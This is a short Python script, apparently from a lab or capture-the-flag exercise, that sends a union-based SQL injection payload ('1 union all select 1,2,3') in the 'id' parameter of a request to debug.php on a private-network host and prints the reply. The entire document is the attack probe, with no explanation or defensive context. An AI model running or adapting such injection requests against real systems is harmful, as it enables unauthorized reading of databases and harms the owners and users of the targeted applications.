#!/usr/bin/python3
import requests

url = 'http://192.168.176.10/debug.php'
params = {'id':'1 union all select 1,2,3'}

r = requests.get(url=url, params = params)

print(r.text)
